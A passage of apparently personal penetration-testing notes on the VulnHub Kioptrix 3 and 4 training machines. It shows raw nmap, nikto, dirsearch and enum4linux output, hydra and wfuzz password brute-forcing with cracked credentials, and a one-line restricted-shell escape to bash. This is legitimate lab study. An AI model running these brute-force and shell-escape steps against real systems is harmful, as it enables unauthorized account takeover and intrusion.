  httponly flag not set<br />|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch<br />|_http-title: Ligoat Security - Got Goat? Security ...<br />MAC Address: 00:0C:29:67:AF:E2 (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 12.07 seconds<br /><br /><br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host <a href="http://192.168.11.7:80">http://192.168.11.7:80</a> | tee nikto_192.168.11.7:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.7<br />+ Target Hostname:    192.168.11.7<br />+ Target Port:        80<br />+ Start Time:         2019-11-06 18:40:52 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch<br />+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Cookie PHPSESSID created without the httponly flag<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.<br />+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br />+ Server leaks inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009<br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.<br />+ OSVDB-3268: /icons/: Directory indexing found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ /phpmyadmin/: phpMyAdmin directory found<br />+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.<br />+ 7534 requests: 0 error(s) and 19 item(s) reported on remote host<br />+ End Time:           2019-11-06 18:41:09 (GMT-5) (17 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.7:80">http://192.168.11.7:80</a> --simple-report dirsearchsimple_192.168.11.7:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-11-06_18-40-53.log<br /><br />Target: <a href="http://192.168.11.7:80">http://192.168.11.7:80</a><br /><br />[18:40:53] Starting: <br />[18:40:53] 200 -    2KB - /index.php<br />[18:40:53] 200 -   68KB - /icons/<br />[18:40:53] 200 -    2KB - /modules/<br />[18:40:53] 500 -    6KB - /gallery/<br />[18:40:53] 403 -  324B  - /data/<br />[18:40:54] 200 -    0B  - /core/<br />[18:40:55] 200 -   18B  - /update.php<br />[18:40:55] 200 -    0B  - /style/<br />[18:40:55] 200 -    2KB - /cache/<br />[18:41:20] 200 -    8KB - /phpmyadmin/<br />[18:44:51] 403 -  333B  - /server-status/<br /><br />Task Completed<br />root@kali:~/Desktop/</div><div class='page'><h1 class='title level-6'>hydra</h1><br/>hydra -l loneferret -P /root/Desktop/Tools/Wordlists/rockyou.txt -t 6 ssh://192.168.11.7<br />Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.<br /><br />Hydra (<a href="http://www.thc.org/thc-hydra)">http://www.thc.org/thc-hydra)</a> starting at 2019-11-06 20:19:01<br />[DATA] max 6 tasks per 1 server, overall 6 tasks, 14344399 login tries (l:1/p:0), ~14344399 tries per task<br />[DATA] attacking ssh://192.168.11.7:22/<br />[STATUS] 114.00 tries/min, 114 tries in 00:00h, 0 to do in 01:00h, 14344285 active<br />[STATUS] 106.00 tries/min, 318 tries in 00:00h, 0 to do in 03:00h, 14344081 active<br />[22][ssh] host: 192.168.11.7   login: loneferret   password: starwars<br />1 of 1 target successfully completed, 1 valid password found<br />Hydra (<a href="http://www.thc.org/thc-hydra)">http://www.thc.org/thc-hydra)</a> finished at 2019-11-06 20:25:50<br /></div><div class='page'><h1 class='title level-6'>flag.txt</h1><br/>root@Kioptrix3:~# cat Congrats.txt <br />Good for you for getting here.<br />Regardless of the matter (staying within the spirit of the game of course)<br />you got here, congratulations are in order. Wasn&#39;t that bad now was it.<br /><br />Went in a different direction with this VM. Exploit based challenges are<br />nice. Helps workout that information gathering part, but sometimes we<br />need to get our hands dirty in other things as well.<br />Again, these VMs are beginner and not intented for everyone. <br />Difficulty is relative, keep that in mind.<br /><br />The object is to learn, do some research and have a little (legal)<br />fun in the process.<br /><br /><br />I hope you enjoyed this third challenge.<br /><br />Steven McElrea<br />aka loneferret<br /><a href="http://www.kioptrix.com">http://www.kioptrix.com</a><br /><br /><br />Credit needs to be given to the creators of the gallery webapp and CMS used<br />for the building of the Kioptrix VM3 site.<br /><br />Main page CMS: <br /><a href="http://www.lotuscms.org">http://www.lotuscms.org</a><br /><br />Gallery application: <br />Gallarific 2.1 - Free Version released October 10, 2009<br /><a href="http://www.gallarific.com">http://www.gallarific.com</a><br />Vulnerable version of this application can be downloaded<br />from the Exploit-DB website:<br /><a href="http://www.exploit-db.com/exploits/15891/">http://www.exploit-db.com/exploits/15891/</a><br /><br />The HT Editor can be found here:<br /><a href="http://hte.sourceforge.net/downloads.html">http://hte.sourceforge.net/downloads.html</a><br />And the vulnerable version on Exploit-DB here:<br /><a href="http://www.exploit-db.com/exploits/17083/">http://www.exploit-db.com/exploits/17083/</a><br /><br /><br />Also, all pictures were taken from Google Images, so being part of the<br />public domain I used them.<br /><br />root@Kioptrix3:~# <br /></div><div class='page'><h1 class='title level-4'>Kioptrix Level 4</h1><br/>nmap showed that the machine was running 22, 80, 139, 445<br />dirsearch showed me the directories /robert and /john<br />Kicked off hydra for robert and john and got the passwords<br />john        MyNameIsJohn<br />robert      Some base64 encoded shit<br /><br />Once I got a password I tried it with ssh... Success got a shell!!<br />too bad it is way restricted<br />Research showed that I was looking at lshell... which is written in python... and handles echo weird...<br />echo import os<br />echo os.system(&#39;/bin/bash&#39;)<br />cat /root/congrats.txt<br />    yee</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>wfuzz -z file,/root/Desktop/Tools/Wordlists/rockyou.txt -d &quot;myusername=john&amp;mypassword=FUZZ&amp;Submit=Login&quot; <a href="http://192.168.11.8/index.php">http://192.168.11.8/index.php</a> &gt; wfuzzJohnResults.txt<br /><br /><br /><br /><table class="table"><tr><th>click me</th><th>click me</th><th>click me</th><th>click me</th></tr><tr><td>Username</td><td>:</td><td>john</td><td>                                                                </td></tr><tr><td>Password</td><td>:</td><td>MyNameIsJohn</td><td> </td></tr></table><br /><br /><br /><table class="table"><tr><th>click me</th><th>click me</th><th>click me</th><th>click me</th></tr><tr><td>Username</td><td>:</td><td>robert</td><td>                                                                </td></tr><tr><td>Password</td><td>:</td><td>ADGAdsafdfwt4gadfga==</td><td> </td></tr></table><br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 192.168.11.8<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-11 16:51 EST<br />Nmap scan report for 192.168.11.8<br />Host is up (0.00067s latency).<br />Not shown: 566 closed ports, 430 filtered ports<br />PORT    STATE SERVICE<br />22/tcp  open  ssh<br />80/tcp  open  http<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br />MAC Address: 00:0C:29:FD:60:F1 (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds<br /><br /><br />nmap -sC -sV -p- 192.168.11.8<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-11 16:51 EST<br />Nmap scan report for 192.168.11.8<br />Host is up (0.0012s latency).<br />Not shown: 39528 closed ports, 26003 filtered ports<br />PORT    STATE SERVICE     VERSION<br />22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)<br />|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)<br />80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)<br />|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)<br />MAC Address: 00:0C:29:FD:60:F1 (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_clock-skew: mean: -2h29m56s, deviation: 3h32m08s, median: -4h59m57s<br />|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br />| smb-os-discovery: <br />|   OS: Unix (Samba 3.0.28a)<br />|   Computer name: Kioptrix4<br />|   NetBIOS computer name: <br />|   Domain name: localdomain<br />|   FQDN: Kioptrix4.localdomain<br />|_  System time: 2019-11-11T11:52:43-05:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 92.07 seconds<br /></div><div class='page'><h1 class='title level-7'>smb vulns</h1><br/>nmap -p 139,445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 192.168.11.8<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-11 17:08 EST<br />NSE: Loaded 7 scripts for scanning.<br />NSE: Script Pre-scanning.<br />NSE: Starting runlevel 1 (of 1) scan.<br />Initiating NSE at 17:08<br />Completed NSE at 17:08, 0.00s elapsed<br />Initiating ARP Ping Scan at 17:08<br />Scanning 192.168.11.8 [1 port]<br />Completed ARP Ping Scan at 17:08, 0.04s elapsed (1 total hosts)<br />Initiating Parallel DNS resolution of 1 host. at 17:08<br />Completed Parallel DNS resolution of 1 host. at 17:08, 4.03s elapsed<br />Initiating SYN Stealth Scan at 17:08<br />Scanning 192.168.11.8 [2 ports]<br />Discovered open port 139/tcp on 192.168.11.8<br />Discovered open port 445/tcp on 192.168.11.8<br />Completed SYN Stealth Scan at 17:08, 0.05s elapsed (2 total ports)<br />NSE: Script scanning 192.168.11.8.<br />NSE: Starting runlevel 1 (of 1) scan.<br />Initiating NSE at 17:08<br />Completed NSE at 17:08, 5.00s elapsed<br />Nmap scan report for 192.168.11.8<br />Host is up, received arp-response (0.00044s latency).<br />Scanned at 2019-11-11 17:08:50 EST for 9s<br /><br />PORT    STATE SERVICE      REASON<br />139/tcp open  netbios-ssn  syn-ack ttl 64<br />445/tcp open  microsoft-ds syn-ack ttl 64<br />MAC Address: 00:0C:29:FD:60:F1 (VMware)<br /><br />Host script results:<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: false<br />|_smb-vuln-ms17-010: This system is patched.<br /><br />NSE: Script Post-scanning.<br />NSE: Starting runlevel 1 (of 1) scan.<br />Initiating NSE at 17:08<br />Completed NSE at 17:08, 0.00s elapsed<br />Read data files from: /usr/bin/../share/nmap<br />Nmap done: 1 IP address (1 host up) scanned in 10.01 seconds<br />           Raw packets sent: 3 (116B) | Rcvd: 5 (410B)</div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.8:80">http://192.168.11.8:80</a> --simple-report dirsearchsimple_192.168.11.8:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-11-11_16-52-18.log<br /><br />Target: <a href="http://192.168.11.8:80">http://192.168.11.8:80</a><br /><br />[16:52:18] Starting: <br />[16:52:18] 200 -  931B  - /images/<br />[16:52:18] 403 -  327B  - /cgi-bin/<br />[16:52:18] 200 -   68KB - /icons/<br />[16:52:19] 200 -    1KB - /index/<br />[16:52:19] 403 -  323B  - /doc/<br />[16:52:20] 302 -  220B  - /member/  -&gt;  index.php<br />[16:52:20] 302 -  220B  - /member.php  -&gt;  index.php<br />[16:52:21] 200 -    1KB - /index.php<br />[16:52:26] 302 -    0B  - /logout.php  -&gt;  index.php<br />[16:52:26] 302 -    0B  - /logout/  -&gt;  index.php<br />[16:52:37] 200 -  912B  - /john/<br />[16:53:15] 200 -  920B  - /robert/<br />[17:03:06] 403 -  333B  - /server-status/<br /><br />Task Completed<br />root@kali:~/Desktop/Machines/VulnHub/Kioptrix_4# <br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host <a href="http://192.168.11.8:80">http://192.168.11.8:80</a> | tee nikto_192.168.11.8:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.8<br />+ Target Hostname:    192.168.11.8<br />+ Target Port:        80<br />+ Start Time:         2019-11-11 16:52:15 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch<br />+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.<br />+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br />+ Uncommon header &#39;tcn&#39; found, with contents: list<br />+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See <a href="http://www.wisec.it/sectou.php?id=4698ebdc59d15.">http://www.wisec.it/sectou.php?id=4698ebdc59d15.</a> The following alternatives for &#39;index&#39; were found: index.php<br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-3268: /icons/: Directory indexing found.<br />+ OSVDB-3268: /images/: Directory indexing found.<br />+ OSVDB-3268: /images/?pattern=/etc/*&amp;sort=name: Directory indexing found.<br />+ Server leaks inodes via ETags, header found with file /icons/README, inode: 98933, size: 5108, mtime: Tue Aug 28 06:48:10 2007<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ Cookie PHPSESSID created without the httponly flag<br />+ 8345 requests: 0 error(s) and 20 item(s) reported on remote host<br />+ End Time:           2019-11-11 16:53:15 (GMT-5) (60 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>enum4linux</h1><br/>enum4linux -a 192.168.11.8 | tee e4lresults.txt<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Mon Nov 11 16:52:38 2019<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 192.168.11.8<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ==================================================== <br />|    Enumerating Workgroup/Domain on 192.168.11.8    |<br /> ==================================================== <br />[+] Got domain/workgroup name: WORKGROUP<br /><br /> ============================================ <br />|    Nbtstat Information for 192.168.11.8    |<br /> ============================================ <br />Looking up status of 192.168.11.8<br />	KIOPTRIX4       &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service<br />	KIOPTRIX4       &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service<br />	KIOPTRIX4       &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service<br />	WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections<br />	WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name<br /><br />	MAC Address = 00-00-00-00-00-00<br /><br /> ===================================== <br />|    Session Check on 192.168.11.8    |<br /> ===================================== <br />[+] Server 192.168.11.8 allows sessions using username &#39;&#39;, password &#39;&#39;<br /><br /> =========================================== <br />|    Getting domain SID for 192.168.11.8    |<br /> =========================================== <br />Domain Name: WORKGROUP<br />Domain Sid: (NULL SID)<br />[+] Can&#39;t determine if host is part of domain or part of a workgroup<br /><br /> ====================================== <br />|    OS information on 192.168.11.8    |<br /> ====================================== <br />Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br />[+] Got OS info for 192.168.11.8 from smbclient: <br />[+] Got OS info for 192.168.11.8 from srvinfo:<br />	KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)<br />	platform_id     :	500<br />	os version      :	4.9<br />	server type     :	0x809a03<br /><br /> ============================= <br />|    Users on 192.168.11.8    |<br /> ============================= <br />index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody	Name: nobody	Desc: (null)<br />index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert	Name: ,,,	Desc: (null)<br />index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root	Name: root	Desc: (null)<br />index: 0x4 RID: 0xbba acb: 0x00000010 Account: john	Name: ,,,	Desc: (null)<br />index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret	Name: loneferret,,,	Desc: (null)<br /><br />user:[nobody] rid:[0x1f5]<br />user:[robert] rid:[0xbbc]<br />user:[root] rid:[0x3e8]<br />user:[john] rid:[0xbba]<br />user:[loneferret] rid:[0xbb8]<br /><br /> ========================================= <br />|    Share Enumeration on 192.168.11.8    |<br /> ========================================= <br />WARNING: The &quot;syslog&quot; option is deprecated<br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />	print$          Disk      Printer Drivers<br />	IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))<br />Reconnecting with SMB1 for workgroup listing.<br /><br />	Server               Comment<br />	---------            -------<br /><br />	Workgroup            Master<br />	---------            -------<br />	WORKGROUP            <br /><br />[+] Attempting to map shares on 192.168.11.8<br />//192.168.11.8/print$	Mapping: DENIED, Listing: N/A<br />//192.168.11.8/IPC$	[E] Can&#39;t understand response:<br />WARNING: The &quot;syslog&quot; option is deprecated<br />NT_STATUS_NETWORK_ACCESS_DENIED listing \*<br /><br /> ==================================================== <br />|    Password Policy Information for 192.168.11.8    |<br /> ==================================================== <br /><br /><br />[+] Attaching to 192.168.11.8 using a NULL share<br /><br />[+] Trying protocol 445/SMB...<br /><br />[+] Found domain(s):<br /><br />	[+] KIOPTRIX4<br />	[+] Builtin<br /><br />[+] Password Info for Domain: KIOPTRIX4<br /><br />	[+] Minimum password length: 5<br />	[+] Password history length: None<br />	[+] Maximum password age: Not Set<br />	[+] Password Complexity Flags: 000000<br /><br />		[+] Domain Refuse Password Change: 0<br />		[+] Domain Password Store Cleartext: 0<br />		[+] Domain Password Lockout Admins: 0<br />		[+] Domain Password No Clear Change: 0<br />		[+] Domain Password No Anon Change: 0<br />		[+] Domain Password Complex: 0<br /><br />	[+] Minimum password age: None<br />	[+] Reset Account Lockout Counter: 30 minutes <br />	[+] Locked Account Duration: 30 minutes <br />	[+] Account Lockout Threshold: None<br />	[+] Forced Log off Time: Not Set<br /><br /><br />[+] Retieved partial password policy with rpcclient:<br /><br />Password Complexity: Disabled<br />Minimum Password Length: 0<br /><br /><br /> ============================== <br />|    Groups on 192.168.11.8    |<br /> ============================== <br /><br />[+] Getting builtin groups:<br /><br />[+] Getting builtin group memberships:<br /><br />[+] Getting local groups:<br /><br />[+] Getting local group memberships:<br /><br />[+] Getting domain groups:<br /><br />[+] Getting domain group memberships:<br /><br /> ======================================================================= <br />|    Users on 192.168.11.8 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ======================================================================= <br />[I] Found new SID: S-1-5-21-2529228035-991147148-3991031631<br />[I] Found new SID: S-1-22-1<br />[I] Found new SID: S-1-5-32<br />[+] Enumerating users using SID S-1-5-21-2529228035-991147148-3991031631 and logon username &#39;&#39;, password &#39;&#39;<br />S-1-5-21-2529228035-991147148-3991031631-500 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-501 KIOPTRIX4\nobody (Local User)<br />S-1-5-21-2529228035-991147148-3991031631-502 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-503 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-504 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-505 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-506 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-507 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-508 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-509 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-510 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-511 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-512 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-513 KIOPTRIX4\None (Domain Group)<br />S-1-5-21-2529228035-991147148-3991031631-514 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-515 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-516 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-517 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-518 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-519 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-520 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-521 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-522 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-523 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-524 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-525 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-526 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-527 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-528 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-529 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-530 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-531 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-532 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-533 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-534 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-535 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-536 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-537 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-538 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-539 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-540 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-541 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-542 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-543 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-544 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-545 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-546 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-547 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-548 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-549 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-550 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1000 KIOPTRIX4\root (Local User)<br />S-1-5-21-2529228035-991147148-3991031631-1001 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1002 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1003 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1004 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1005 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1006 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1007 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1008 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1009 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1010 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1011 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1012 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1013 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1014 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1015 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1016 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1017 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1018 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1019 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1020 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1021 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1022 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1023 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1024 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1025 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1026 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1027 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1028 *unknown*\*unknown* (8)<br 